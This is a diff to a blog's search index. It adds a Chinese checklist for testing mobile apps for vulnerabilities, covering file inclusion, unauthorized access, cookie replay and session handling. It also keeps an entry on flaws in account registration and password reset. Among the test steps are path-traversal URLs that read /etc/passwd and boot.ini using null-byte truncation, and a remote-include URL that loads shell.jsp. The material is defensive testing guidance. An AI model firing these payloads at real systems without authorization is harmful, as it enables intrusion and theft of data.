@@ -3,6 +3,20 @@
   
     
     <entry>
+      <title><![CDATA[移动端常见漏洞检测方法]]></title>
+      <url>%2F2017%2F01%2F11%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%2F</url>
+      <content type="text"><![CDATA[本地文件包含检查要点是否可以包含本地任意文件 检查对象APP 检查方法1.通过AWVS扫描，查看扫面结果在，是否存在local file include漏洞2.更改参数的值为其他路径和文件进行验证，在浏览器地址栏中尝试一下URL：对于LINUX/UNIX服务器可以尝试包含/etc/passwdhttp://www.example.com/viewfile?fiilename=../etc/passwd对于Windows服务器可以尝试包含http://www.example.com/viewfile?fiilename=c:\boot.ini文件3.尝试使用截断，来绕过对文件类型的检查，例如：http://www.example.com/viewfile?fiilename=../../../../../../../etc/passwd%00 判断条件可以包含任意本地文件，如：/etc/passwd或者/boot.ini等，则不通过 远程文件包含检查要点是否可以远程包含文件 检查对象APP 检查方法1.通过AWVS扫描，查看扫描结果中，是否存在file include漏洞2.更改参数的值为本机的一个web服务根目录下的一个文件，例如shell.jsphttp://www.exmaple.com/viewfile.do?filename=http://192.168.110.160/shell.jsp3.常识使用截断，来绕过对文件类型的检查，例如：http://www.exmaple.com/viewfile.do?filename=http://192.168.110.160/etc/passwd%00 判断条件可以包含远程文件，如：包含http://www.baidu.com，则不通过 未授权访问检查要点是否存在垂直条件提升 检查对象APP 检查方法1.利用“敏感数据扫描工具”在不登陆情况下访问需要账号权限的URL2.查看扫描工具检测结果中可被未授权访问的URL3.对未授权访问的URL进行手工验证 判断条件能访问则不通过 越权访问检查要点1.是否使用低权限可以访问高权限账号的URL2.是否存在同级越权 检查对象APP 检查方法1.低权限账号可以访问高权限账号1)使用高权限账号登陆，抓取一下只有高权限账号才能登陆的URL2)退出高权限账号，使用低权限账号登陆后，尝试访问这些高权限账号能访问的URL2.同级别越权使用A账号能否访问B账号的特定数据，实现越权访问 判断条件低权限账号能访问高权限账号才能访问的URL能不通过；同级权限时，可访问其他账号特定数据，则不通过 短信接口恶意调用检查要点是否存在短信接口恶意调用 检查对象APP 检查方法1.在调用短信接口的过程中，使用burp进行抓包，修改发送目标与内容2.查看能否按照预定的发送短信 判断条件能给指定用户发送短信（短信内容可编辑），则不通过 Cookie重放检查要点是否存在Cookie重放 检查对象APP 检查方法1.使用burp进行抓包获取一个账号的登录cookie2.在异地使用编辑cookie功能设置刚才抓取的cookie，然后重放该攻击 判断条件能成功利用该cookie则不通过 Session失效检查要点是否在关闭浏览器、注销、超时的情况下session失效 检查对象APP 检查方法1.在正常业务操作中，通过burp抓取session id2.在关闭浏览器、注销、超时后分别执行第三步3.使用第一步抓取的session id访问(利用edit cookie访问某需要登录后次啊能访问的URL) 判断条件能访问则不通过 Session绕过检查要点是否存在Session绕过 检查对象APP 检查方法1.使用burp进行抓包获取一个正常业务操作的包，并删除session id后提交请求，查看是否可以成功访问 判断条件能访问则不通过 会话无Session校验检查要点是否存在会话无Session校验 检查对象APP 检查方法1.在正常业务操作中，对数据访问进行抓包，查看数据包中是否存在session等字段，如果没有，则进行如下操作2.在异地直接打开URL 判断条件能直接打开则不通过]]></content>
+    </entry>
+
+    
+    <entry>
+      <title><![CDATA[常见安全漏洞及整改建议]]></title>
+      <url>%2F2017%2F01%2F10%2F%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%95%B4%E6%94%B9%E5%BB%BA%E8%AE%AE%2F</url>
+      <content type="text"></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[常见漏洞测试流程案例之账号注册、密码找回]]></title>
       <url>%2F2017%2F01%2F03%2F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%A1%88%E4%BE%8B%E4%B9%8B%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%2F</url>
       <content type="text"><![CDATA[账号注册唯一身份标识(非自增ID，如手机号，用户名等)重复注册漏洞编号：WooYun-2012-13986url：http://wooyun.jozxing.cc/static/bugs/wooyun-2012-013986.html唯一身份标识可以重复注册，会导致劫持前人的ID；如一个网站是以username作为唯一身份标识，当可以注册一个重复的username时候，进入个人空间会导致查询出错等问题。 没严格验证身份信息漏洞编号：WooYun-2014-87354url：http://wooyun.jozxing.cc/static/bugs/wooyun-2014-087354.html这种情况分为两种，第一种完全没有任意判断（不需要验证码和激活链接的）；第二种是需要激活账号的；第一种大家都知道，下面说说第二种，a用户用自己邮箱注册一个账号，然后拿到激活链接，然后在用别人的邮箱注册一次，然后再访问激活链接，这样情况严格来说是属于逻辑缺陷，但是账号注册这块挺重要的，就写在这里了。 垃圾账号注册漏洞编号：WooYun-2013-34225url：http://wooyun.jozxing.cc/static/bugs/wooyun-2013-034225.html在不判断用户身份信息以及没有验证码等限制的时候会导致垃圾账号批量注册，如以上漏洞，没有验证码，写个脚本跑一下就可以注册很多用户，可以用于恶意推销。 密码找回验证身份信息的验证码存储在客户端；漏洞编号：WooYun-2016-169802url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0169802.html手机邮箱找回验证码时，验证码返回到客户端的时候，可导致任意用户密码重置；如a用户在b.com找回一个不属于他的账号，手机号找回密码会发送验证码到那个手机号上，如果验证码也返回到客户端的话，a用户可以直接用该验证码重置那个账号的密码。 验证码爆破；漏洞编号：WooYun-2016-202426url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0202426.html现在网站都是基于验证码来判断用户身份的，这种方式是正确的，但是实现的过程可能会导致很多严重的安全问题，如验证码的有效期、验证码错误多少次会导致验证码过期，下面说的这种情况就是没有做任何处理的，比如手机密码找回，返回4位数的验证码且无任何限制，这种情况如上面漏洞案例所说的一样，可以爆破出验证码。 本地验证；漏洞编号：WooYun-2016-207115url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0207115.html很多密码找回都是依靠返回的request的json的某个字段值来判断是否可以重置密码，然后再进行重置密码，这种情况就是本地验证，也就是说我们重置密码的过程，把返回包修改一下就可以重置密码了。这种情况出现过很多，都是没有经过二次判断的。感谢乌云的案例。 本文转载自：http://zone.secevery.com/?/article/370]]></content>
